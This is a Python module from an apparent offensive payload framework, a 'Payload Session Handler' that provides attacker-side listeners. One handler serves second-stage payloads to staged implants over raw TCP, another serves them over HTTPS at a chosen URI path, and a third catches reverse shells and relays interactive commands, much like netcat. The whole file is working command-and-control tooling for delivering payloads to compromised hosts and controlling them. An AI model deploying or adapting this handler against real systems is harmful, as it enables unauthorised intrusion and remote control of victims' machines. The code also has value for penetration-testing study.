import os
import sys
import ssl
import time
import struct
import socket
import threading
import http.server
import socketserver

from sickle.common.lib.generic import modparser

time_start = time.time()

class TCPStagerHandler(socketserver.StreamRequestHandler):
    """This class is responsible for handling incoming TCP based connections.
    Wherein there is an expectation that the client expects a second stage to
    be sent. That said upon recieving a connection this handler will send a
    second stage to the target
    """

    def handle(self):
        """Handles TCP connection
        """

        log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}\n")
        self.request.send(struct.pack('<Q', len(self.server.stage)))
        self.request.send(self.server.stage)

class SimpleTTYHandler(socketserver.StreamRequestHandler):
    """This class is responsible for handling incoming TCP based reverse shells.
    Consider this to operate in a similiar fashion to a standard netcat. As the
    module gets updated it will be able to handle common mistakes made by users
    such as hitting [CTRL] + [C].
    """

    def handle(self):
        """Handles the TCP session
        """

        log_print(f"Connection established with {self.client_address[0]}\n\n")

        while True:

            self.request.settimeout(0.1)

            response = b""
            while True:
                try:
                    data = self.request.recv(4096)
                except:
                    break

                response += data

            self.request.settimeout(30)

            shell_prompt = response.decode('latin-1')

            self.request.sendall(input(shell_prompt).encode('latin-1') + b'\n')

class HTTPSStagerHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        """Handles GET requests made to the HTTPS server
        """

        if (self.server.uri_path in self.path):
            log_print(f"Sending stage ({len(self.server.stage)} bytes) to {self.client_address[0]}\n")
            self.wfile.write(struct.pack('<Q', len(self.server.stage)))
            self.wfile.write(self.server.stage)

class Module():

    name = "Payload Session Handler"

    module = "handler"

    example_run = f"{sys.argv[0]} -m {module}"

    platform = "Multi"

    arch = "Multi"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Linux", "Windows"]

    summary = ""

    description = ("")

    arguments = {}
    arguments["HANDLER"] = {}
    arguments["HANDLER"]["optional"] = "no"
    arguments["HANDLER"]["description"] = "Handler for incoming connections"
    arguments["HANDLER"]["options"] = { "tty": "Simple TTY handler similiar to netcat for capturing a shell" }

    arguments["SRVHOST"] = {}
    arguments["SRVHOST"]["optional"] = "yes"
    arguments["SRVHOST"]["description"] = "IP to bind handler to"
    
    arguments["SRVPORT"] = {}
    arguments["SRVPORT"]["optional"] = "yes"
    arguments["SRVPORT"]["description"] = "Port to bind handler to"

    advanced = {}
    advanced["PATH"] = {}
    advanced["PATH"]["optional"] = "yes"
    advanced["PATH"]["description"] = "The path expected to be reached by our payload to send the second stage"

    advanced["CERT"] = {}
    advanced["CERT"]["optional"] = "yes"
    advanced["CERT"]["description"] = "The path to a custom PEM file to use for SSL communication"

    def __init__(self, arg_object):
       
        self.arg_list  = arg_object["positional arguments"]
        self.stage     = arg_object["raw bytes"]

        self.set_args()

    def set_args(self):

        all_args = Module.arguments
        all_args.update(Module.advanced)
        argv_dict = modparser.argument_check(all_args, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        self.handler = argv_dict["HANDLER"]

        # Set the SRVHOST and SRVPORT to distribute payloads
        if "SRVHOST" not in argv_dict.keys():
            self.srvhost = "0.0.0.0"
        else:
            self.srvhost = argv_dict["SRVHOST"]

        if "SRVPORT" not in argv_dict.keys():
            self.srvport = 4242
        else:
            self.srvport = int(argv_dict["SRVPORT"])

        # Set the PATH used by HTTP(S) handlers
        if "PATH" not in argv_dict.keys():
            self.uri_path = "corn"
        else:
            self.uri_path = argv_dict["PATH"]

        # Set the CERT path that is used by HTTPS if there is not one present, create it
        if "CERT" not in argv_dict.keys():
            current_directory = os.path.dirname(os.path.abspath(__file__))
            if os.path.isfile(f"{current_directory}/cert.pem") == False:
                log_print("It appears that the HTTPS handler does not have a default certificate generated\n")
                log_print("Would you like to generate one (Y/N): ")
                create_cert = input()
                if (create_cert.lower() == 'y') or (create_cert.lower() == 'yes'):
                    cmd = f"openssl req -new -x509 -keyout {current_directory}/cert.pem -out {current_directory}/cert.pem -days 31337 -nodes"
                    log_print(f"Executing: {cmd}\n")
                    os.system(cmd)

            self.cert = f"{current_directory}/cert.pem"
        else:
            self.cert = argv_dict["CERT"]
            if os.path.isfile(self.cert) == False:
                log_print("Unable to open {self.cert}\n")
                exit(-1)

    def do_thing(self):

        if self.handler == "tty":
            self.start_tty_handler()
        elif self.handler == "tcp":
            self.start_tcp_handler()
        elif self.handler == "https":
            self.start_https_handler()
        else:
            print(f"{self.handler} is not a valid handler\n")
            exit(-1)

    def start_https_handler(self):
        
        s_addr = (self.srvhost, self.srvport)
        httpd = http.server.HTTPServer(s_addr, HTTPSStagerHandler)
        log_print(f"HTTPSStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}\n")

        sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        sslctx.check_hostname = False
        sslctx.load_cert_chain(certfile=self.cert,
                               keyfile=None,
                               password=None)

        httpd.socket = sslctx.wrap_socket(httpd.socket,
                                          server_side=True)

        httpd.stage = self.stage
        httpd.uri_path = self.uri_path

        httpd.serve_forever()

    def start_tcp_handler(self):
        """Starts a TCP Handler, allowing you to respond to a client using a
        custom stager. This is useful when using staged stubs in which the
        initial stub reaches out this this handler and executes the bytes we
        send.

        :return: Nothing
        :rtype: None
        """

        stage_server = socketserver.TCPServer((self.srvhost, self.srvport), TCPStagerHandler)
        log_print(f"TCPStagerHandler started, serving payloads @{{{self.srvhost}:{self.srvport}}}\n")
        stage_server.stage = self.stage
        stage_server.serve_forever()

    def start_tty_handler(self):
        """Starts a TTY Handler, essentially allowing you to capture a reverse
        shell and interact with it.

        :return: Nothing
        :rtype: None
        """

        log_print(f"SimpleTTYHandler started on {self.srvhost}:{self.srvport}\n")
        server = socketserver.TCPServer((self.srvhost, self.srvport), SimpleTTYHandler)
        server.serve_forever()

def log_print(msg):
    """Prints a message with a timestamp prepended. This timestamp is based on
    when the handler was started.

    :param msg: The string to be printed alongside the timestamp
    :type msg: str

    :return: Prints message to stdout and returns nothing
    :rtype: None
    """

    elapsed = time.time() - time_start
    sys.stdout.write(f"[{elapsed:12.6f}] {msg}")
    
    return
